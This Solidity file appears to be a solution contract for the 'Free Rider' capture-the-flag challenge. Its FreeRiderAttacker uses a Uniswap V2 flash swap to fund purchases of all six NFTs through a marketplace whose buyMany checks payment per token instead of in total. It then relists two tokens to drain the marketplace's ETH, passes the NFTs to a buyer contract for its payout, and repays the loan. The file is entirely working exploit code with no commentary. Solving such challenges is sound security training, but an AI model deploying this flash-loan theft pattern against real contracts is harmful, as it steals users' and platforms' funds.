// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

interface WETH {
	function deposit() external payable;

	function withdraw(uint256) external ;
	function transfer(address dst, uint wad) external returns (bool);
}

interface IUniswapV2Pair {
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
contract FreeRiderAttacker {
	WETH private weth;
	FreeRiderNFTMarketplace private marketplace;
	IUniswapV2Pair public pair;
	uint256[] tokenids;
	uint256[] offerids;
	uint256[] prices;
	address private buyer;

	constructor (address _weth, address payable _marketplace, address _pair, address _buyer)  {
		weth = WETH(_weth);
		marketplace = FreeRiderNFTMarketplace(_marketplace);
		pair = IUniswapV2Pair(_pair);
		buyer = _buyer;
	}
	function attack(uint256 amount) external{
		address token0 = pair.token0();
        address token1 = pair.token1();
		uint amount0Out = address(weth) == token0 ? amount : 0;
        uint amount1Out = address(weth) == token1 ? amount : 0;

		pair.swap(amount0Out, amount1Out, address(this), "x");
		payable(address(msg.sender)).transfer(address(this).balance);
	}

	function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
		weth.withdraw(amount0);
		// uint256[] memory tokenids = new uint256[](6);
		// uint256[] memory tokenids;
		tokenids.push(0);
		tokenids.push(1);
		tokenids.push(2);
		tokenids.push(3);
		tokenids.push(4);
		tokenids.push(5);
		marketplace.buyMany{value : 15 * 10**18}(tokenids);
		// uint256[] memory offerids;
		offerids.push(1);
		offerids.push(2);
		IERC721 x = marketplace.token();
		require(x.ownerOf(0) == address(this));
		x.approve(address(marketplace), 1); 
		x.approve(address(marketplace), 2);
		prices.push(16 ether);
		prices.push(address(marketplace).balance);
		marketplace.offerMany(offerids, prices);
		marketplace.buyMany{value : 16 ether}(offerids);
		require(address(marketplace).balance == 0);
		for(uint i=0;i<6;i++)
		{
			x.safeTransferFrom(address(this), buyer, i);
			require(x.ownerOf(i) == buyer);
		}
		require(buyer.balance == 0);
		weth.deposit{value : amount0 + 1 ether}();
		weth.transfer(msg.sender, amount0 + 1 ether);

	}


    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable {}
}